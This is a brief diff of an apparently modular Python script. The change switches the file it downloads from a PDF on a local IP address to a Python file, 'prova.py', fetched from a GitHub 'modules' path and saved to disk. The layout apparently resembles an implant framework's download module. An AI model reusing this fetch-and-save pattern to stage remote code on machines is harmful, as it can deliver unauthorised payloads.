@@ -4,8 +4,8 @@ def run(**args):
   try:
      print("[*] reading")
    
-     goodie = "license.pdf"
-     url = 'http://192.168.1.4:8000/license.pdf'
+     goodie = "prova.py"
+     url = 'https://github.com/experiment2016/workhub/blob/master/modules/prova.py'
      r = requests.get(url, stream=True)
 
      with open(goodie, 'wb') as fd:
